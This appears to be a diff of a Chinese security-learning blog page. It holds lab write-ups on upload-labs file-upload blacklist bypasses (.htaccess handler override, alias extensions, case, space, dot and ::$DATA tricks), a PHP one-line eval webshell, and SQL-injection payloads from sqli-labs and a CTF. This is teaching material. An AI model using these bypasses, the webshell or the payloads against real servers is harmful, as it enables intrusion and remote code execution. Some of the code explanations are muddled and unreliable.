+<h3 id="理解一下什么是MIME？"><a href="#理解一下什么是MIME？" class="headerlink" title="理解一下什么是MIME？"></a>理解一下什么是MIME？</h3><h6 id="MIME-多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。"><a href="#MIME-多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。" class="headerlink" title="MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。"></a>MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。</h6><p>$_FILES[‘myfile’][‘type’]文件的MIME类型，需要浏览器提供该信息的支持，例如”image/gif”</p>
+<p>MIME 给出的是文件的MIME信息 ，此信息可以用来在HTTP Conten-type 头 信息中发送 正确的信息，如：header(“Cotent-type:image/gif”)</p>
+<pre><code>文件格式
+编辑
+播报
+最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。
+MIME意为多功能Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。
+每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。
+七种大类别：
+video
+image
+application
+text
+audio
+multipart
+message
+常见的MIME类型(通用型)：
+超文本标记语言文本 .html text/html
+xml文档 .xml text/xml
+XHTML文档 .xhtml application/xhtml+xml
+普通文本 .txt text/plain
+RTF文本 .rtf application/rtf
+PDF文档 .pdf application/pdf
+Microsoft Word文件 .word application/msword
+PNG图像 .png image/png
+GIF图形 .gif image/gif
+JPEG图形 .jpeg,.jpg image/jpeg
+au声音文件 .au audio/basic
+MIDI音乐文件 mid,.midi audio/midi,audio/x-midi
+RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio
+MPEG文件 .mpg,.mpeg video/mpeg
+AVI文件 .avi video/x-msvideo
+GZIP文件 .gz application/x-gzip
+TAR文件 .tar application/x-tar
+任意的二进制数据 application/octet-stream
+</code></pre>
+<h5 id="涉及的函数用法"><a href="#涉及的函数用法" class="headerlink" title="涉及的函数用法"></a>涉及的函数用法</h5><pre><code>trim():去除左右两侧的空白
+deldot（）：删除末尾的店
+strrchar(string,char):函数查找串，在string字符串中查找，char在string字符串中最后一次出现的位置，返回并从该位置截取到尾，如果没有找到字符，则返回false
+strrchar(&#39;hello  wordld,i love you &#39;,&#39;i&#39;)
+输出结果： i love you 
+strtolower():函数 把所有字符串装换成小写
+str_ireplace(fine,replace,strin):替换，
+在strin字符串中，去搜索fine字符串，如果
+搜到到匹配上了，用replace字符串进行替换
+</code></pre>
+<h2 id="pass-03-文件后缀名，黑名单绕过"><a href="#pass-03-文件后缀名，黑名单绕过" class="headerlink" title="pass-03(文件后缀名，黑名单绕过)"></a>pass-03(文件后缀名，黑名单绕过)</h2><p>上传木马后</p>
+<p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！            </p>
+<p>查看原代码</p>
+<pre><code>&lt;?php
+include &#39;../config.php&#39;;
+include &#39;../common.php&#39;;
+include &#39;../head.php&#39;;
+include &#39;../menu.php&#39;;
+
+$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) &#123;
+                 $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<h4 id="分析一下代码："><a href="#分析一下代码：" class="headerlink" title="分析一下代码："></a>分析一下代码：</h4><p>这里使用了数组的方式，设置了黑名单，不允许.asp  .aspx  .php  .jsp 的后缀名文件进行上传。</p>
+<h4 id="绕过思路："><a href="#绕过思路：" class="headerlink" title="绕过思路："></a>绕过思路：</h4><p>php开发了这么久了，不止只有这一个文件名，我们可以使用其他的php的别名进行绕</p>
+<p>过：.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345 （但是这里是有前提条件的）就是对方的</p>
+<p>服务器的配置有对这些php其他的文件名配置了解析的设置，否认就算你上传上去了，还是解析失败。</p>
+<p>配置好了对应的解析，直接修改文件名就好了把1.php修改成你配置的对应的解析的文件名。</p>
+<h4 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h4><p>test.php修改后test.phtml    上传成功！</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523230745151.png" alt="image-20230523230745151"></p>
+<p>蚁剑连接</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523231053874.png" alt="image-20230523231053874"></p>
+<h2 id="pass-04-文件名后缀验证，配置文件解析控制"><a href="#pass-04-文件名后缀验证，配置文件解析控制" class="headerlink" title="pass-04(文件名后缀验证，配置文件解析控制)"></a>pass-04(文件名后缀验证，配置文件解析控制)</h2><p>上传木马后</p>
+<p>提示：此文件不允许上传!     </p>
+<p>查看一下源代码</p>
+<p>黑名单里面禁止上传这些后缀的文件</p>
+<pre><code class="php">.php,.php5,.php4,.php3,.php2,.php1,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.pHp1,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.ini
+</code></pre>
+<p>  <img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230524203551062.png" alt="image-20230524203551062">     </p>
+<p>从源代码中可以看出，还是使用了一个黑名单的限制，对文件的后缀名进行了验证，并且限制的后缀名比之前的更多。但是我们可以从黑名单中看出没有对.htaccess文件进行验证，那么我们就可以使用.htaccess进行绕过。</p>
+<h5 id="htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个-htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。-htaccess文件只对Apache服务器有效-。"><a href="#htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个-htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。-htaccess文件只对Apache服务器有效-。" class="headerlink" title=".htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。"></a>.htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。</h5><p>操作步骤：</p>
+<p>1.首先先创建一个 .htaccess 的文件在文件中写入</p>
+<pre><code>SetHandler application/x-httpd-php
+</code></pre>
+<p>2.把这个文件上传到服务器上。</p>
+<p>3.将一句话木马文件名修改成gif/png/jpe其中格式的一种。比如2.png</p>
+<p> 上传成功。</p>
+<p>4.将p.git(一句话木马的文件)上传到服务器</p>
+<p>这里的关键点就是.htaccess这个文件，把所有的目录下的文件的解析方式都修改成了php，</p>
+<p>所以我们第二次上传的图片2.png “png”不在黑名单中，但是由于.htaccess文件所以又把他解析成了php的格式，所以可以完成正常的解析。</p>
+<h2 id="pass-05-文件名后缀验证-点-空格-点"><a href="#pass-05-文件名后缀验证-点-空格-点" class="headerlink" title="pass-05(文件名后缀验证 ,点+空格+点)"></a>pass-05(文件名后缀验证 ,点+空格+点)</h2><p>查看源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<pre><code>定义两个变量：is_upload代表文件是否上传成功，msg代表错误信息提示。
+
+if...sumit
+检测是否有表单提交数据通过检测$_POST数组中是否存在’submit’键名。
+
+if(file_exits (UPLOAD_PATH))&#123;
+如果指定的文件夹存在通过检测目录是否存在(即在服务器上是否有上传文件夹)
+
+$deny_ext黑名单,定义了一个包含不允许上传的文件类型的$deny_ext数组
+
+$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+$file_name = deldot($file_name);//删除文件名末尾的点
+获取上传文件名并删除文件名末尾的点
+
+$file_ext = strrchr($file_name, &#39;.&#39;);
+$file_ext = strtolower($file_ext); //转换为小写
+$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+$file_ext = trim($file_ext); //首尾去空
+从上传文件名中提取文件扩展名并运行一些大小写转换和字符串替换处理。
+
+if (!in_array($file_ext, $deny_ext)) &#123;
+如果文件类型是可接受的，则执行下一步操作。、
+
+$temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+获取上传文件在服务器临时目录中的路径和在指定目录中显示的路径。
+
+if (move_uploaded_file($temp_file, $img_path)) &#123;
+    $is_upload = true;
+&#125; else &#123;
+    $msg = &#39;上传出错！&#39;;
+&#125;
+将上传文件从服务器临时目录移动到指定目录，并确定是否上传成功，$msg则保存了任何错误信息。
+
+&#125; else &#123;
+    $msg = &#39;此文件类型不允许上传！&#39;;
+&#125;
+如果文件类型不是可接受的，则发送错误提示消息。
+
+&#125; else &#123;
+    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+&#125;
+如果指定的上传文件夹不存在，则向用户返回一条错误消息。
+</code></pre>
+<p>bp抓包看看</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231428383.png" alt="image-20230610231428383"></p>
+<p>用蚁剑连接</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231151446.png" alt="image-20230610231151446"></p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231315662.png" alt="image-20230610231315662"></p>
+<h2 id="Pass-06-文件名后缀验证，大小写绕过"><a href="#Pass-06-文件名后缀验证，大小写绕过" class="headerlink" title="Pass-06 (文件名后缀验证，大小写绕过)"></a>Pass-06 (文件名后缀验证，大小写绕过)</h2><p>查看提示，黑名单禁止上传</p>
+<pre><code>.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini
+</code></pre>
+<p>查看源代码</p>
+<p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p>
+<p>源码中没有转换成小写，所以我们可以用大小写绕过</p>
+<h2 id="Pass-07-文件名后缀验证-空格绕过"><a href="#Pass-07-文件名后缀验证-空格绕过" class="headerlink" title="Pass-07 (文件名后缀验证,空格绕过)"></a>Pass-07 (文件名后缀验证,空格绕过)</h2><p><code>$file_name= trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); //代码中无收尾去空函数trim() //去除字符串中的空格</code></p>
+<p>方法：<code>后缀加空格</code></p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175638767.png" alt="image-20230610175638767"></p>
+<p>然后用蚁剑连接</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175730423.png" alt="image-20230610175730423"></p>
+<h2 id="pass-08-文件名后缀验证-点绕过"><a href="#pass-08-文件名后缀验证-点绕过" class="headerlink" title="pass-08(文件名后缀验证,点绕过)"></a>pass-08(文件名后缀验证,点绕过)</h2><p>代码中无deldot()函数 //删除文件名末尾的点</p>
+<p>   <code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
+<p>方法：<code>在后缀 . </code></p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223429650.png" alt="image-20230610223429650"></p>
+<p>用蚁剑连接</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223253561.png" alt="image-20230610223253561"></p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223326733.png" alt="image-20230610223326733"></p>
+<h2 id="pass-09-文件名后缀验证-DATA绕过"><a href="#pass-09-文件名后缀验证-DATA绕过" class="headerlink" title="pass-09(文件名后缀验证,::$DATA绕过)"></a>pass-09(文件名后缀验证,::$DATA绕过)</h2><p>源码中</p>
+<p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p>
+<p>少了str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p>
+<h3 id="利用Windows特性"><a href="#利用Windows特性" class="headerlink" title="利用Windows特性"></a>利用Windows特性</h3><h4 id="在window的时候如果文件名-”-DATA”会把-DATA之后的数据当成文件流处理-不会检测后缀名，且保持-DATA之前的文件名，他的目的就是不检查后缀名"><a href="#在window的时候如果文件名-”-DATA”会把-DATA之后的数据当成文件流处理-不会检测后缀名，且保持-DATA之前的文件名，他的目的就是不检查后缀名" class="headerlink" title="在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名"></a><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></h4><p>科普一下</p>
+<p>什么是::$DATA呢？</p>
+<p>::$DATA这是一种windows操作系统处理文件时的特性，为<code>文件流</code>，如果文件名后有此标记::$DATA</p>
+<p>,并且没有做过滤，windows会不检查，直接保存该文件。使用他的目的就是不检查后缀名。</p>
+<p>所以我们只要在文件名后面加上::$DATA就可以成功绕过</p>
+<h3 id="方法：后缀加上-DATA"><a href="#方法：后缀加上-DATA" class="headerlink" title="方法：后缀加上::$DATA"></a>方法：<strong>后缀加上::$DATA</strong></h3><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224605256.png" alt="image-20230610224605256"></p>
+<p>用蚁剑连接</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224421981.png" alt="image-20230610224421981"></p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224445287.png" alt="image-20230610224445287"></p>
+<h2 id="pass-10-文件名后缀验证-点-空格-点"><a href="#pass-10-文件名后缀验证-点-空格-点" class="headerlink" title="pass-10(文件名后缀验证,点+空格+点)"></a>pass-10(文件名后缀验证,点+空格+点)</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/" data-id="cljwyeabe0008y0vgdc08a5no" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time datetime="2023-05-21T13:30:40.000Z" itemprop="datePublished">2023-05-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="websell"><a href="#websell" class="headerlink" title="websell"></a>websell</h2><h3 id="什么叫做webshell？"><a href="#什么叫做webshell？" class="headerlink" title="什么叫做webshell？"></a>什么叫做webshell？</h3><p>1.webshell,简称为网页后门。简单来说它是运行在web应用之上的远程控制程序。</p>
+<p>2.webshell是一张网页，由PHP，JSP,ASP,NET等这类web应用开发程序语言开发，但webshell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</p>
+<h3 id="常见的webshell有哪些？"><a href="#常见的webshell有哪些？" class="headerlink" title="常见的webshell有哪些？"></a>常见的webshell有哪些？</h3><p>1.大马、小马、一句话木马、菜刀马、脱库马、各种马…等</p>
+<p>2，拥有较完整功能的webshell，我们一般称为大马</p>
+<p>3.功能相对简单的webshell成为小马</p>
+<h3 id="webshell有什么作用？"><a href="#webshell有什么作用？" class="headerlink" title="webshell有什么作用？"></a>webshell有什么作用？</h3><h3 id="怎样能获取getshell？"><a href="#怎样能获取getshell？" class="headerlink" title="怎样能获取getshell？"></a>怎样能获取getshell？</h3><h3 id="webshell之php一句话木马解读"><a href="#webshell之php一句话木马解读" class="headerlink" title="webshell之php一句话木马解读"></a>webshell之php一句话木马解读</h3><pre><code>&lt;?php @eval($_post[x]);?&gt;
+</code></pre>
+<p>$_post[x]:获取post请求参数中x的值。例如post请求中传递x=phpinfo(); , 那么$_post[x]就等同于</p>
+<p>phpinfo(); </p>
+<p>eval()将字符串当做PHP代码运行。例如eval(’phpinfo();’) , 其中phpinfo();会被当做PHP代码去执行。</p>
+<pre><code>&lt;?php @eval($_POST[X]);?&gt;    实际上的传递过程是这样的
 
 
 
-[强网杯 2019]随便注1.先判断注入类型
-11
+
+&lt;?php @eval(`phpinfo();`);?&gt;   实际的语句是这样的
+</code></pre>
+<p>我们通过该webshell，传递任意php代码，</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cljwyeabm000gy0vg4gckf0pb" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
-正常显示，再试试别的
-11&#x27;
+  
+    <article id="post-’宽字节注入’" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/" class="article-date">
+  <time datetime="2023-05-17T15:44:46.000Z" itemprop="datePublished">2023-05-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/">宽字节注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过sql注入防御。</p>
+<h3 id="常见的字符集"><a href="#常见的字符集" class="headerlink" title="常见的字符集"></a>常见的字符集</h3><p>ascii编码：单字节编码</p>
+<p>0x00 null<br>0x20<br>0x21 !<br>0x22 “<br>0x23 #<br>0x24 $<br>0x25 %<br>0x26 &amp;<br>0x27 ’<br>0x28 (<br>0x29)<br>0x2A *<br>0x2B +<br>0x2C ,<br>0x2D -<br>0x2E .<br>0x2F /<br>0x3A :<br>0x3B ;<br>0x3C &lt;<br>0x3D =<br>0x3E &gt;<br>0x3F ?<br>0x40 @<br>0x5B [<br>0x5C<br>0x5D ]<br>0x5E ^<br>0x5F _<br>0x60 `<br>0x7B {<br>0x7C |<br>0x7D }<br>0x7E ~</p>
+<p>latin1编码：单字节编码</p>
+<p>gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和ascii保持一致。双字节的第一个字节范围是0x81-0xFE</p>
+<p>utf-8编码：使用一至四字节编码，0x00-0x7F范围内是一位，和ascii保持一致。其他字符用二至四个字节变长表示。</p>
+<h3 id="MySQL字符转换"><a href="#MySQL字符转换" class="headerlink" title="MySQL字符转换"></a>MySQL字符转换</h3><p>数据提交到mysql数据库，需要进行字符集的转换，使得mysql数据库可以对数据进行处理，这个过程一般有以下三个步骤：</p>
+<p>收到请求，将请求数据从character_set_client -&gt;character_set_connection.</p>
+<p>内部操作，将数据从character_set_connection  –&gt;表创建的字符集。</p>
+<p>结果输出，将数据从表创建的字符集 –&gt;character_set_results。</p>
+<p>当执行set names ”charset”，相当于执行</p>
+<p>set character_set_client = charset</p>
+<p>set character_set_connection = charset</p>
+<p>set character_set_results = charset</p>
+<p>client 指的是php程序</p>
+<p>connection指的是php客户端与mysql服务器之间连接层</p>
+<p>results 指的是mysql服务器返回给PHP客户端的结果</p>
+<h3 id="sqli-labs-less-32"><a href="#sqli-labs-less-32" class="headerlink" title="sqli-labs/less-32"></a>sqli-labs/less-32</h3><p>1.查看源码</p>
+<pre><code>&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+
+function check_addslashes($string)
+&#123;
+    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash
+    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash
+    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash
+      
+    
+    return $string;
+&#125;
+
+// take the variables 
+if(isset($_GET[&#39;id&#39;]))
+&#123;
+$id=check_addslashes($_GET[&#39;id&#39;]);
+//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;
+
+//logging the connection parameters to a file for analysis.
+$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
+fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+fclose($fp);
+
+// connectivity 
+
+mysql_query(&quot;SET NAMES gbk&quot;);
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+    if($row)
+    &#123;
+      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;    
+      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+      echo &quot;&lt;br&gt;&quot;;
+      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+      echo &quot;&lt;/font&gt;&quot;;
+      &#125;
+    else 
+    &#123;
+    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysql_error());
+    echo &quot;&lt;/font&gt;&quot;;  
+    &#125;
+&#125;
+    else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;
+        
+        
+
+?&gt;
+</code></pre>
+<p>普通注入</p>
+<pre><code>?id=1&#39;
+</code></pre>
+<p><img src="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/image-20230521112543826.png" alt="image-20230521112543826"></p>
+<p>第一步：被check_addslashes函数转义</p>
+<p><code>check_addslashes</code> 函数并不是完全安全的，因为它只是简单地添加反斜杠来转义特殊字符。</p>
+<p>第二步：在执行sql查询之前，mysql_query(“SET NAMES gbk”);将MySQL的三个字符集设置为 gbk 编码</p>
+<p>第三步：character_set_client告诉MySQL Server，传入的是gbk编码，也就是’被当做了%5C%27传入</p>
+<p>第四步：character_set_client –&gt;character_set_connection编码完全一致，数据没有任何转换，所以输入是%5C%27,输出的是%5%27</p>
+<p>第五步：character_set_connection  –&gt;table charset这里我们需要关注下使用的表的字符集。</p>
+<p><img src="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/image-20230521203503187.png" alt="image-20230521203503187"></p>
+<p>可以看到id参数没有设置编码方式，不会对%5C%27进行处理。在这里mysql服务器将查询语句执行，并返回结果。</p>
+<p>执行的sql语句为：</p>
+<p>$sql=“SELECT * FROM users WHERE id=‘1’’ LIMIT 0,1”;<br> ‘被转义无法进行注入</p>
+<p>第六步：table charset –&gt;character_set_results字符集也设定为gbk，保证了输出内容没有乱码。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/" data-id="cljwyeabg000cy0vgg4fx5g4t" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
-出现错误，说明存在注入，看一下报错信息，没有显示有用的信息，在试试万能注入
-11&#x27; or 1=1;#
+  
+    <article id="post-堆叠注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2023-05-16T11:54:24.000Z" itemprop="datePublished">2023-05-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">堆叠注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
